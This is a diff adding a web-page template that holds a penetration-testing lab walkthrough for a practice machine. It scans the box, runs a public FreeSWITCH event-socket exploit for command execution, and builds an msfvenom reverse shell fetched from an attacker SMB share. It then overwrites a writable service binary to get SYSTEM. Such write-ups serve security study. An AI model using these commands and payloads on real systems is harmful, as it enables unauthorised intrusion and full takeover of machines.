@@ -1,0 +1,168 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX151</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ sudo nmap -p- -sCV 192.168.144.151 --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 23:14 EST
+Nmap scan report for 192.168.144.151
+Host is up (0.20s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE          VERSION
+80/tcp   open  http             Microsoft IIS httpd 10.0
+|_http-title: IIS Windows
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+3389/tcp open  ms-wbt-server    Microsoft Terminal Services
+| ssl-cert: Subject: commonName=OSCP
+| Not valid before: 2025-12-01T04:12:24
+|_Not valid after:  2026-06-02T04:12:24
+|_ssl-date: 2025-12-02T04:15:24+00:00; +19s from scanner time.
+7680/tcp open  tcpwrapped
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 18s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.57 seconds</code></pre></div>
+
+<p class="text">The 8021 is interesting open port. I searched the name and found exploit code <a href="https://www.exploit-db.com/exploits/47799">here</a>.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ wget https://www.exploit-db.com/download/47799
+
+┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ mv 47799 exploit.py</code></pre></div>
+
+<p class="text">I could use this exploit code to cause RCE.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ python3 exploit.py 192.168.115.151 'whoami'                  
+Authenticated
+Content-Type: api/response
+Content-Length: 11
+
+oscp\chris</code></pre></div>
+
+<p class="text">I created revshell exe file with msfvenom and served this via impacket-smbserver.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=4444 -f exe -o rev.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload                                                                       
+No encoder specified, outputting raw payload                                                                                     
+Payload size: 460 bytes                                                                                                          
+Final size of exe file: 7680 bytes                                                                                               
+Saved as: rev.exe  
+
+┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</code></pre></div>
+
+<p class="text">Using exploit like below, I uploaded generated exe file.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ python3 exploit.py 192.168.115.151 'net use \\192.168.45.244\share'                        
+Authenticated
+Content-Type: api/response
+Content-Length: 37
+
+
+                                                                                                                                 
+┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ python3 exploit.py 192.168.115.151 'copy \\192.168.45.244\share\rev.exe C:\programdata\rev.exe' 
+Authenticated
+Content-Type: api/response
+Content-Length: 26</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ python3 exploit.py 192.168.115.151 'C:\programdata\rev.exe'                                    
+Authenticated</code></pre></div>
+
+<p class="text">I got reverse shell.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.115.151] 50175
+Microsoft Windows [Version 10.0.19043.2130]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\FreeSWITCH></code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I found running service binary which seems to be editable.</p>
+<div class="code-box"><pre><code>PS C:\Users\chris\Desktop> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object{$_.State -like 'Running'} | findstr /i "program files"
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object{$_.State -like 'Running'} | findstr /i "program files"
+FreeSWITCH             Running "C:\Program Files\FreeSWITCH\FreeSwitchConsole.exe"  -service                    
+<u>KiteService</u>            Running C:\program files\Kite\KiteService.exe                                            
+VGAuthService          Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"           
+VMTools                Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                              
+WinDefend              Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2210.6-0\MsMpEng.exe" </code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\program files\Kite> icacls KiteService.exe
+icacls KiteService.exe
+KiteService.exe OSCP\chris:(I)(<u>M</u>)
+                NT AUTHORITY\SYSTEM:(I)(F)
+                BUILTIN\Administrators:(I)(F)
+                BUILTIN\Users:(I)(RX)
+                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</code></pre></div>
+
+                <p class="text">We have modify right. So, I could overwrite this file with reverse shell code and restart the application.</p>
+<div class="code-box"><pre><code>PS C:\program files\Kite> sc.exe stop KiteService
+sc.exe stop KiteService
+
+SERVICE_NAME: KiteService 
+        TYPE               : 10  WIN32_OWN_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+PS C:\program files\Kite> net use \\192.168.45.244\share  
+net use \\192.168.45.244\share
+Local name        
+Remote name       \\192.168.45.244\share
+Resource type     Disk
+Status            Disconnected
+# Opens           0
+# Connections     1
+The command completed successfully.
+
+PS C:\program files\Kite> copy \\192.168.45.244\share\rev.exe KiteService.exe
+copy \\192.168.45.244\share\rev.exe KiteService.exe
+PS C:\program files\Kite> sc.exe start KiteService
+sc.exe start KiteService</code></pre></div>
+
+<p class="text">I got revshell from NA user.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPB/151]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.115.151] 50177
+Microsoft Windows [Version 10.0.19043.2130]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\
+cd C:\
+
+C:\>whoami
+whoami
+nt authority\system</code></pre></div>
+
+</body>
+</html>
